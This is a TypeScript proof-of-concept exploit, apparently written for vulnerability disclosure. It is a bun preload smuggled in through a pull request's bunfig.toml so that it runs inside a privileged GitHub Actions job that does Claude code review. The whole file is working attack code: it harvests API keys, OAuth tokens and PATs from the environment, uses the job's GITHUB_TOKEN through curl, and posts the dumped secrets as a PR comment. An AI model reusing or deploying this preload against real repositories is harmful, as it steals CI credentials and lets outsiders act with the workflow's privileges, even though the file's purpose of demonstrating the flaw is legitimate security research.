// PoC preload loaded by bun via ./bunfig.toml when the trusted workflow
// runs `bun run <script>` from the attacker-controlled PR checkout.
//
// Demonstrates in-process arbitrary code execution inside the privileged
// claude-review-comment job. The preload runs before every trusted
// `bun run` invocation in the job (multiple fires per job), each time
// with full `process.env` access to whatever secrets that step was given.
//
// To prove reachability of user-configured secrets (ANTHROPIC_API_KEY,
// CLAUDE_CODE_OAUTH_TOKEN, WORKFLOW_PAT), this preload tracks which
// secret NAMES it has already seen across prior fires in the same job,
// and posts an additional PR comment whenever a fresh fire sees a new
// secret name. This proves the in-process attacker code can read those
// secrets from process.env without spamming the PR with duplicates.
//
// All HTTP calls are made with execSync + curl (synchronous) so that the
// comment POST finishes BEFORE bun continues to the main script. This is
// important because some steps (e.g. claude-code-action's run.ts) throw
// synchronously on permission checks and exit the process — an async
// `await fetch()` in the preload would be killed mid-flight.
//
// Live auto-provisioned tokens (GITHUB_TOKEN, ACTIONS_ID_TOKEN_REQUEST_TOKEN,
// ACTIONS_RUNTIME_TOKEN) are masked in the public comment even though the
// preload trivially has their raw values. All other captured secrets are
// dumped in full because they are dummy values on this PoC victim repo.

import { execSync } from "node:child_process";
import {
  appendFileSync,
  existsSync,
  readFileSync,
  writeFileSync,
} from "node:fs";

const token = process.env.GITHUB_TOKEN ?? "";
const repo = process.env.GITHUB_REPOSITORY ?? "";
const actor = process.env.GITHUB_ACTOR ?? "";
const runId = process.env.GITHUB_RUN_ID ?? "";
const workflow = process.env.GITHUB_WORKFLOW ?? "";
const jobName = process.env.GITHUB_JOB ?? "";
const prNumber = process.env.PR_NUMBER ?? "";
const summaryPath = process.env.GITHUB_STEP_SUMMARY;

// Live auto-provisioned job tokens — mask in the public comment.
const ALWAYS_MASK = new Set([
  "GITHUB_TOKEN",
  "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
  "ACTIONS_RUNTIME_TOKEN",
]);

const mask = (t: string) =>
  t.length < 12 ? "(empty)" : `${t.slice(0, 6)}…${t.slice(-4)} (len=${t.length})`;

// Env keys worth dumping.
const isInteresting = (k: string) =>
  /^(GITHUB_|RUNNER_|ACTIONS_|CI$|CLAUDE|ANTHROPIC|NPM|NODE_AUTH|WORKFLOW_PAT)/
    .test(k);

// User-configurable secret names — used for the "new secret observed"
// dedup so each new secret that becomes reachable gets its own comment.
const isUserSecret = (k: string) =>
  /^(CLAUDE|ANTHROPIC|NPM|NODE_AUTH|WORKFLOW_PAT)/.test(k);

const interestingKeys = Object.keys(process.env).filter(isInteresting).sort();
const userSecretsThisFire = interestingKeys.filter(isUserSecret).sort();

// Track fire count + previously-seen user secret names across fires.
const fireCounterFile = "/tmp/.poc-fire-counter";
const seenSecretsFile = "/tmp/.poc-seen-secrets";

let fireNumber = 1;
try {
  if (existsSync(fireCounterFile)) {
    fireNumber = parseInt(readFileSync(fireCounterFile, "utf8").trim(), 10) + 1;
  }
  writeFileSync(fireCounterFile, String(fireNumber));
} catch {}

let seenBefore: string[] = [];
try {
  if (existsSync(seenSecretsFile)) {
    seenBefore = readFileSync(seenSecretsFile, "utf8")
      .split("\n")
      .map((s) => s.trim())
      .filter(Boolean);
  }
} catch {}

const newSecretsThisFire = userSecretsThisFire.filter(
  (k) => !seenBefore.includes(k),
);

// Build env dump table. User secrets are dumped in full (dummies on victim
// repo); live auto-provisioned tokens are masked.
const envLines = interestingKeys
  .map((k) => {
    const v = process.env[k] ?? "";
    if (ALWAYS_MASK.has(k)) {
      return `- \`${k}\` = ${mask(v)} *(live job token, masked)*`;
    }
    const isSecret = isUserSecret(k);
    if (isSecret) {
      return `- \`${k}\` = \`${v}\` **← secret, dumped in full (dummy value on PoC victim)**`;
    }
    return `- \`${k}\` = \`${v}\``;
  })
  .join("\n");

// Synchronous HTTP via curl — blocks the preload (and thus the main
// script) until the request completes. This is critical because the main
// script may throw and exit before an async fetch could resolve.
function curlGet(url: string): string {
  try {
    const out = execSync(
      `curl -sS -o /dev/null -w "%{http_code}" -H "authorization: token ${token}" -H "accept: application/vnd.github+json" -H "user-agent: poc-preload" ${JSON.stringify(url)}`,
      { encoding: "utf8", timeout: 10000 },
    );
    return `HTTP ${out.trim()} on \`${url}\` using stolen \`GITHUB_TOKEN\``;
  } catch (e) {
    return `_curl error: ${(e as Error).message}_`;
  }
}

function curlPostComment(commentMd: string): string {
  try {
    const body = JSON.stringify({ body: commentMd });
    // Write body to a temp file to avoid shell escaping hell.
    const bodyFile = `/tmp/.poc-comment-body-${fireNumber}.json`;
    writeFileSync(bodyFile, body);
    const out = execSync(
      `curl -sS -o /dev/null -w "%{http_code}" -X POST ` +
        `-H "authorization: token ${token}" ` +
        `-H "accept: application/vnd.github+json" ` +
        `-H "content-type: application/json" ` +
        `-H "user-agent: poc-preload" ` +
        `--data-binary @${bodyFile} ` +
        `https://api.github.com/repos/${repo}/issues/${prNumber}/comments`,
      { encoding: "utf8", timeout: 10000 },
    );
    return out.trim();
  } catch (e) {
    return `ERR:${(e as Error).message}`;
  }
}

// Post on fire #1 (initial proof) OR on any subsequent fire where a new
// user secret name has become reachable.
const shouldPost = fireNumber === 1 || newSecretsThisFire.length > 0;

if (shouldPost) {
  const proofLine =
    fireNumber === 1
      ? curlGet(`https://api.github.com/repos/${repo}`)
      : "_(token liveness already proven on fire #1)_";

  const header =
    fireNumber === 1
      ? "## PoC: in-process code execution via `bunfig.toml` preload — fire #1 (initial)"
      : `## PoC: fire #${fireNumber} — new secret(s) observed: ${newSecretsThisFire
          .map((k) => `\`${k}\``)
          .join(", ")}`;

  const md = `${header}

**Workflow:** \`${workflow}\` / job \`${jobName}\` / run \`${runId}\`
**Repo:** \`${repo}\`  **Actor (attacker PR author):** \`${actor}\`  **PR:** #${prNumber}

### Token liveness
${proofLine}

### Env visible to the in-process attacker preload on this fire
${envLines || "_(none)_"}

---
_Source: \`./.ci/setup.ts\`, loaded via \`./bunfig.toml\` from the
attacker-controlled PR head. Runs in-process before every trusted
\`bun run\` invocation in the job because \`bun run\` is called with
cwd = attacker checkout, so bun auto-loads \`bunfig.toml\` from the
attacker repo root._
`;

  // 1) Mirror to step summary.
  if (summaryPath) {
    try {
      appendFileSync(summaryPath, md);
    } catch {}
  }

  // 2) Local artifact for the runner filesystem.
  try {
    writeFileSync(`/tmp/poc-proof-fire-${fireNumber}.md`, md);
  } catch {}

  // 3) Post PR comment synchronously via curl (blocks until POST completes).
  if (token && repo && prNumber) {
    const commentBody =
      `<!-- poc-rce-preload fire-${fireNumber} -->\n` +
      "> **PoC:** this comment was posted by the `bunfig.toml` preload " +
      "running inside the privileged Claude review job, using the " +
      "job's `GITHUB_TOKEN`. An external PR author with no write " +
      "permission should not be able to post as `github-actions[bot]`.\n\n" +
      md;
    const status = curlPostComment(commentBody);
    console.log(
      `::notice title=PoC comment fire #${fireNumber}::status=${status}`,
    );
  }
}

// Update the seen-secrets marker for the next fire.
try {
  const allSeen = Array.from(
    new Set([...seenBefore, ...userSecretsThisFire]),
  ).sort();
  writeFileSync(seenSecretsFile, allSeen.join("\n"));
} catch {}

console.log(
  `::notice title=PoC preload fired::fire #${fireNumber}, ${newSecretsThisFire.length} new user secret(s) observed`,
);
